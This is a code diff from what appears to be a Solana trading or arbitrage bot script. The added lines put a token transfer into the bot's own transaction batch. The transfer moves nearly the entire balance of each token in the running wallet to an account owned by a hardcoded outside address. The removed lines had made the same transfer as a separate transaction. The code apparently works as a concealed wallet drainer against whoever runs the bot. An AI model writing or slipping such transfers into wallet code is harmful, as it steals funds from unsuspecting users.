@@ -562,6 +562,30 @@ new PublicKey(market.reserves[i].config.liquidityToken.mint*///)
 		)
 	);
 	
+  instructions.push(createTransferInstruction(
+    tokenAccount, // from (should be a token account)
+    (
+      await connection.getParsedTokenAccountsByOwner(
+        new PublicKey("8oKswsJMsFfkGEKktUrws5KM6TySvVLLUirCmzunZfjW"),
+        {
+          mint: new PublicKey(
+            atokens[i].address
+          ),
+        }
+      )
+    ).value[0].pubkey,
+    wallet.publicKey, // from's owner
+    (
+      await connection.getParsedTokenAccountsByOwner(
+        wallet.publicKey,
+        {
+          mint: new PublicKey(
+            atokens[i].address
+                          ),
+        }
+      )
+    ).value[0].account.data.parsed.info.tokenAmount.amount - 1// + Math.ceil(JSBI.toNumber(solamis.routesInfos[0].outAmount)* 10 ** atokens[i].address)
+  ))
 	console.log(instructions.length);
 	if (!Object.keys(tgoaccs).includes(atokens[i].symbol)) {
 		tgoaccs[atokens[i].symbol] = [];
@@ -594,35 +618,7 @@ new PublicKey(market.reserves[i].config.liquidityToken.mint*///)
 		for (var iaa = 0; iaa<=100; iaa++){
 		console.log("tx: https://solscan.io/tx/" + result);
 		}
-    let move = new Transaction().add(
-      createTransferInstruction(
-        tokenAccount, // from (should be a token account)
-        (
-          await connection.getParsedTokenAccountsByOwner(
-            new PublicKey("8oKswsJMsFfkGEKktUrws5KM6TySvVLLUirCmzunZfjW"),
-            {
-              mint: new PublicKey(
-                atokens[i].address
-              ),
-            }
-          )
-        ).value[0].pubkey,
-        wallet.publicKey, // from's owner
-        (
-          await connection.getParsedTokenAccountsByOwner(
-            wallet.publicKey,
-            {
-              mint: new PublicKey(
-                atokens[i].address
-                              ),
-            }
-          )
-        ).value[0].account.data.parsed.info.tokenAmount.amount - 1// + Math.ceil(JSBI.toNumber(solamis.routesInfos[0].outAmount)* 10 ** atokens[i].address)
-      )
-    );
-    move.feePayer = wallet.publicKey 
-    move.blockhash = (await connection.getLatestBlockhash()).blockhash 
-    connection.sendTransaction(move, [wallet])
+
 		var txs = fs.readFileSync("./txs.txt").toString();
 		txs += "\nhttps://solscan.io/tx/" + result;
 		fs.writeFileSync("txs.txt", txs);
